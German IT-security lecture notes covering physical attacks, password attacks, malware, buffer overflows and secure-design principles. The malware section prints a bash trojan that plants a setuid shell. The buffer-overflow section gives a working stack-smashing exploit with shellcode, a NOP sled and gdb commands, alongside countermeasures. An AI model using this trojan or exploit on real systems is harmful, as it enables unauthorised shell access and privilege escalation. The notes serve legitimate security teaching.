# Physischer Zugriff
## Angriffsvektoren
#### Boot- und Live-Media-Angriffe
-**Externe Boot-Medien** - Angreifer kann System von USB-Stick booten, um lokale Festplatte zu mounten, sofern diese nicht ausreichend geschützt ist.
- **Manipulation des Bootloaders** - Durch Änderung an Bootloader oder BIOS/UEFI-Setup können Sicherheitsmechanismen umgangen werden.
#### Auslesen von Daten im Arbeitsspeicher
- **Cold Boot Attack** - Beim Herunterfahren können sensible Daten, z.B. Schlüssel, im RAM verbleiben – Angreifer kann diese extrahieren.
- **Direct Memory Access (DMA) Angriffe** - Angreifer kann über Schnittstellen wie Thunderbolt, FireWire oder PCIe direkten Zugriff auf Arbeitsspeicher erhalten, um vertrauliche Informationen auszulesen.
#### Manipulation und Implantation von Hardware
- **Hardware-Backdoors** - Physische Implantate oder modifizierte Hardwarekomponenten können dauerhaft Zugriffsmöglichkeiten ermöglichen.
- **Keylogger und Überwachungsgeräte** - Einsatz von Hardware-Keyloggern oder anderen Überwachungsgeräten erlaubt Erfassung von Tastatureingaben und anderen Aktivitäten.
#### Manipulation von Firmware und Software
- **Firmware-Angriffe** - Modifizierter BIOS/UEFI-Code oder infizierte Firmware auf Peripheriegeräten kann tiefgreifende Kontrolle über das System ermöglichen.
- **Angriffe auf Debug-Schnittstellen** - Physische Zugangsmöglichkeiten zu Schnittstellen (z. B. JTAG, serielle Debug-Ports) können Ausführung von Code oder Manipulation des Systems erlauben.
#### Direkter Diebstahl oder Austausch von Komponenten
- **Datendiebstahl** - Über physischen Diebstahl von Speichermedien oder anderen Komponenten kann Angreifer sensible Informationen erhalten und offline analysieren.
- **Manipulation von Hardwarekomponenten** - Austausch oder Ergänzung von Komponenten, um z.B. Daten abzufangen oder zu modifizieren.
#### Absichtliche Zerstörung von Hardware
- **Physische Zerstörung** - Angreifer beschädigt oder zerstört direkt Komponenten (z.B. Festplatten, Netzteile, Motherboards).
- **Überhitzung oder Kurzschlüsse** - Manipulationen an Stromversorgung oder Kühlung können zu Überhitzung oder elektrischen Fehlfunktionen bis hin zum Ausfall des Systems führen.
#### Sabotage durch Manipulation von Software/Hardware-Interaktionen
- **Manipulation der Firmware** - Gezielte Eingriffe in Firmware-Updates oder Überschreiben von Firmware kann zu dauerhafter Beeinträchtigung der Funktionsfähigkeit eines Systems führen.
- **Fehlkonfigurationen** - Absichtliche Veränderung kritischer Optionen der Systemkonfiguration (z.B. Überhitzungsschutz).

## Mögliche Absichten des Angreifers
- Datenexfiltration
- Einrichtung von persistenter Kontrolle
- Manipulation und Sabotage
- Erzielung von Wettbewerbsvorteilen oder Spionage
- ...
# Passwörter
![[passwort_hash.png]]
Beim erstellen eines Passworts wird der Hash des Passworts (zuzüglich eines `Salts`) in der Datenbank gespeichert. 
Zur Überprüfung eines Passworts wird der Hash des Passworts mit dem in der Datenbank gespeicherten Hash verglichen.
Siehe hierzu [[Kryptographie#Hash Funktionen|Hash Funktionen]].

## Online-Angriff gegen Passwörter
**Situation:**
- Angreifer kennt den Hash-Wert des Passworts nicht.
- Es muss mit einem Webserver (oder anderem IT-System) interagiert werden.
- Angreifer sendet potenzielles Passwort an Server.
- Server akzeptiert oder verwirft gesendetes Passwort des Angreifers.

**Gängige Sicherheitsmaßnahmen:**
- Beschränkung der Anzahl der Anmeldeversuche
- erzwungene Wartezeit nach Fehlversuch

## Offline-Angriff gegen Passwörter
**Situation:**
- Angreifer kennt Hash-Wert des Passworts.
	- z.B. durch Datenleak einer Datenbank.
- Angreifer kann für beliebige potenzielle Passwörter den zugehörigen Hash-Wert berechnen.
- Angreifer vergleicht Hash-Wert der Passworts mit selbst berechneten Hash-Werten.
- Angreifer hat beliebig viele Versuche.
**Sicherheitsmaßnahmen:**
- schwierig und aufwändig
- lange und komplizierte Passwörter verwenden
# Malware
Als Malware oder Schadsoftware bezeichnet man unerwünschte Software, die die Integrität des Zielsystems gefährdet und eine Schadfunktion (sog. Payload) besitzt.

**Typische Malware-Kategorien:**
- `Trojaner`
- `Viren`
- `Würmer`
- `Backdoors`
- `Sniffer`, `Spyware`, `Keylogger`
- `Botnets`
- `Scareware`
- `Ransomware`

## Einfacher Bash-`Tojaner`
Angreifer platziert Skript `ls` in Linux-System, argloser Admin führt es aus.
``` bash
cp /bin/sh /tmp/.xxsh
chmod u+s,o+x /tmp/.xxsh
rm ./ls
ls $*
```
## Ransomware Beispiel: "Wannacry"
![[wannacry.png]]
# Buffer Overflow
Ein Buffer Overflow (oder Pufferüberlauf) ist, wenn eine Variable ihren eigentlich angedachten Speicherbereich überschreitet. Die kann zum Beispiel passieren, wenn ein Speicherbereich für einen String der Länge 10 reserviert wurde, jedoch ein String der Länge 20, ohne Überprüfung in den Speicherbereich geladen wird.  

Puffer = Speicherbereich
Pufferüberlauf: Die Menge der in den Puffer zu schreibenden Daten ist größer als der Speicherbereich -> Überlauf

## Normale Abarbeitung eines Programms
1. Schrittweise Abarbeitung der Maschinenbefehle, nächster Befehl bei nächsthöherer Speicheradresse
2. Hauptprogramm: Sprunganweisung in ein Unterprogramm (inkl. Parameterübergabe)
	- Herkunftsadresse (Ort von wo das Unterprogramm im Hauptprogramm gestartet wird) muss sich gemerkt werden um an dieser Stelle später das Hauptprogramm fortzuführen
3. Um nach Unterprogramm das Hauptprogramm fortsetzen zu können, wird die Rücksprungadresse auf dem Stack abgelegt.
4. Variablen des Unterprogramms benötigen ebenfalls Platz auf dem Stack -> Trennung zwischen Adresse und Variablen -> `Stack Basepointer` 
5. Sprung in das Unterprogramm
6. Abarbeitung der Maschinenbefehle des Unterprogramms
7. Ende des Unterprogramms 
	1. Rücksprungadresse vom Stack holen
	2. Speicher auf dem Stack wieder freigeben
	3. Rücksprung in das Hauptprogramm
8. Fortsetzung des Hauptprogramms

## Buffer Overflow herbeiführen
Im oben aufgeführten Programmablauf lässt sich ein Buffer Overflow missbrauchen, indem man bei der Ausführung des Unterprogramms einen Buffer Overflow nutzt um (z.B. durch Nutzereingabe eines Strings) den Speicher bis zum `Stack Basepointer` mit dem eigenen Code zu überschreiben. Die `Rücksprungadresse` wird dabei so überschrieben, dass sie auf die Speicheradresse des eingeschleusten Code zeigt. 
Sobald zu der in der `Rücksprungadresse` gespeicherten Adresse gesprungen wird, wird der eingeschleuste Code ausgeführt.
![[stack_aufbau.png]]

Herausforderung aus Angreifer-Sicht:
1. Er weiß nicht an welcher Stelle im Speicher sich die absolute Rücksprungadresse befindet.
   -> Rücksprungadresse mehrfach oberhalb Exploit-Code
2. Er kennt die absoluten Speicheradressen des Programms nicht.
   -> "Landezone" unterhalb des Exploit Code (NOP: no operation)
3. Zeichenkette darf keine `Null`-Bytes enthalten.
   -> Verwendung einer geeigneten Codierung

### Code Beispiele
Damit folgende Beispiele funktionieren wurden einige Sicherheitsmaßnahmen im Betriebssystem deaktiviert.
Siehe auch [[gdb (GNU Debugger)]]. Dieses CLI-Tool wurde verwendet um während des Programmablaufs den Speicher betrachten zu können.
#### Konsolenausgabe
`target0`:
``` C
void versteckt() {
	// Ausgabe eines Strings auf der Standardausgabe
	fprintf(stdout, "You have been pwnd!\n");
}
int funk2(char *arg, char *out) {
	// Kopiert von arg nach out bis arg Nullterminiert (0x00)
	strcpy(out, arg);
	return 0;
}
int funk1(char *argv[]) {
	// allociert 128 Bytes an Speicher
	char buffer[128];
	// ruft funk2 mit dem ersten CMD-Argument auf
	funk2(argv[1], buffer);
}
int main() {
	// Überprüfe, dass genau ein Kommanozeilenparameter übergeben
	// wurde, andernfalls gib eine Fehlermeldung aus
	if (argc != 2) {
		fprintf(stderr, "target0: argc != 2\n");
		exit(EXIT_FAILURE);
	}
	// Rufe funk1 auf
	funk1(argv);
	return 0;
}
```
Die Funktion `versteckt` wird innerhalb von dem Skript `target0` nie aufgerufen. Dennoch lässt sich das Programm über ein Kommandozeilenparameter so manipulieren, dass die Funktion `versteckt` aufgerufen wird. 
Für die Variable `buffer` wurden 128 Bytes an Speicher allokiert. Im Anschluss an den für die Variable `buffer` reservierten Speicher liegt der `Stack Basepointer` (4 Bytes )und im Anschluss daran die `Rücksprungadresse` (ebenfalls 4 Bytes). Da in `funk2` mit dem Methodenaufruf `strcpy` keine Kontrolle stattfindet, ob das Ziel des Kopiervorgangs auch groß genug ist für das übergebene char-Array, lässt sich ein `buffer overflow` herbeiführen und die `Rücksprungadresse` manipulieren.
In diesem Fall wird ein char-Array mit einer Länge von 136 Bytes benötigt um den `Stack Basepointer` und die `Rücksprungadresse` zu überschreiben. Wenn also die letzten 4 Byte des char-Arrays der physischen Adresse der `versteckt`-Funktion entsprechen, wird Diese ausgeführt.
Wenn man das ganze also innerhalb von [[gdb (GNU Debugger)]] durchführen möchte kann man folgenden Befehl verwenden:
``` bash
run target0 ``python -c "print('A'*132 + '\xbb' + '\x84' + '\x04' + '\x08')"`
```
Vorausgesetzt die physischen Adresse der `versteckt`-Funktion lautet `0x80484bb`
Es entsteht zwar ein `Segmentation Fault` am Ende, doch vorher wurde die `versteckt`-Funktion ausgeführt.
#### Öffnen einer Shell
Statt einfach nur 132 A's in die `buffer`-Variable zu schreiben lässt sich auf diese Weise auch weiterer Maschinencode in ein Programm einschleusen. Zur Generierung des Maschinencodes für die Öffnung einer Shell, lässt sich folgendes Python-Skript nutzen:
`exploit.py`
``` python
# Maschinencode zur Öffnung einer Shell von Aleph One
sc = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
# Speicheradresse von buffer, little endian beachten
buffer_addr = '\x8c\xf5\xff\xbf'
length_buffer = 128
size_ebp = 4 # Länge des Stack Basepointer (Bytes)
size_eip = 4 # Länge der Rücksprungadresse (Bytes)
total_length_input = length_buffer + size_ebp + size_eip
# Ausgabe erzeugen, inkl. NOP Sliding
print((total_length_input - len(sc) - len(buffer_addr)) * '\x90' + sc + buffer_addr) 
```
Die Variable `buffer_addr` muss entsprechend auf die Adresse angepasst werden, wo die Variable im physischen Speicher abgelegt ist. Diese muss jedoch nicht ganz exakt sein, da folgend auf die Adresse die `NOP`-Operation (`\x90`) als eine Art "Landezone" steht. Dadurch funktionieren höhere Adressen (bis zu einem gewissen Grad) auch noch.
Wenn man das ganze also innerhalb von [[gdb (GNU Debugger)]] durchführen möchte kann man folgenden Befehl verwenden:
``` bash
run `python exploit.py`
```
Die dabei geöffnete Shell besitzt die gleichen Rechte, wie das ausgeführte Programm. Der nächste Schritt wäre nun z.B. eine `privilege escalation` zu erreichen um an `root`-Rechte zu kommen.
## Schutzmaßnahmen gegen Pufferüberläufe: 
<b>Never trust user input</b>
- sorgfältige Programmierung und Nutzung entsprechender Compiler-Funktionen
- Überprüfung des Programmcodes mit speziellen Werkzeugen
- ASLR ( `Address Space Layout Randomization` )
	- Alle Programmteile und alle eingebundenen Bibliotheken müssen ASLR aktiviert haben, sonst ist der Schutz nicht gegeben.
	- virtuelle Adressen werden durchgemixt
- `Stack Canaries` bzw. `Stack Cookies`
	- Im Stack wird zwischen Rücksprungvariable und den eigentlichen Variablen ein zufälliger Wert gespeichert.
	- Bevor die Rücksprungadresse aufgerufen wird wird überprüft, ob sich dieser zufällige Wert geändert hat.
- `Shadow Stack`
	- Man hat einen vom Haupt-Stack getrennten, zusätzlichen Stack, der nur Rücksprungadressen speichert.  Vor dem Rücksprung vergleicht die CPU ob die normale Rücksprungadresse der `Shadow-Stack`-Adresse entspricht
	- Intel CET ( `Control-Flow Enforcement Technology` ) setzt seit Windows 10 diese Taktik um.
- ESP ( `Excecutable Space Protection` ) 
	- Unter Windows heißt es `Data Excecution Prevention`
	- Es kann nur noch Code ausgeführt werden, welcher innerhalb des für Programmcode reservierten Speicherbereichs liegt.
# Sichere Systeme
## Prinzipien zum Entwurf sicherer Systeme
### Erlaubnisprinzip
`fail-safe defaults`
Jeder Zugriff ist zunächst grundsätzlich verboten (engl. default deny). Nur durch explizite Erlaubnis kann das Zugriffsrecht gewährt werden.
### Vollständigkeitsprinzip
`complete mediation`
Jeder Zugriff auf jedes Objekt ist auf seine Zulässigkeit zu prüfen. Das Prinzip erzwingt, dass Zugriffskontrolle grundsätzlich aus Sicht des gesamten Systems betrachtet werden muss.
### Prinzip der minimalen Rechte
`least privilege, need to know`
Jedes Subjekt erhält nur die Zugriffsrechte, die es zur Wahrnehmung seiner Aufgaben benötigt.
### Prinzip der wirtschaftlichen Mechanismen
`economy of mechanism`
Der Entwurf der Sicherheitsfunktionen sollte so einfach und klein wie möglich sein.
### Prinzip des offenen Entwurfs
`open design`
Das Design der Sicherheitsfunktionen sollte nicht geheim gehalten, sondern offen gelegt werden. Die Entkopplung der Sicherheitsfunktionen von z.B. kryptographischen Schlüsseln erlaubt die Untersuchung des Designs durch Dritte, ohne dabei Gefahr zu laufen, konkrete Daten zu kompromittieren.
## Sicherheitsgrundfunktionen
- Identifikation und Authentifikation
- Rechteverwaltung
- Rechteprüfung
- Beweissicherung
- Wiederaufbereitung
	- Keine Daten im Cache hinterlassen.
- Gewährleistung der Funktionalität
